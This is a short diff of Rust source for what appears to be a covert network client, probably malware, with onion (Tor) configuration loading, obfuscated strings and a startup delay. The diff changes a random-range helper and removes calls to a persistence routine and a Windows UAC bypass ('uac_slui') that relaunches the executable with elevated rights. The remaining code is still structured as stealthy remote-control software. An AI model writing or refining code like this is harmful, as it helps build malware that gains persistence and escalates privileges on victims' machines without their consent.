@@ -649,11 +649,9 @@ pub async fn read_loop(
     })
 }
 fn rand_range(min: u64, max: u64) -> u64 {
-    let nanos = std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap_or_default()
-        .as_nanos();
-    min + (nanos as u64) % (max - min + 1)
+    use rand::Rng;
+    let mut rng = rand::thread_rng();
+    rng.gen_range(min..=max)
 }
 /// Core runner
 pub async fn netclient_run(
@@ -720,16 +718,6 @@ async fn netclient_impl() -> c_int {
         astr!("s")
     );
     sleep(Duration::from_secs(startup_delay)).await;
-
-    let _ = persist::persist();
-
-    #[cfg(target_os = "windows")]
-    if !is_elevated() {
-        if let Ok(exe) = std::env::current_exe() {
-            let path = exe.to_string_lossy().to_string();
-            uac_bypass::uac_slui(&path);
-        }
-    }
 
     let configs = get_onion_configs();
     if configs.is_empty() {
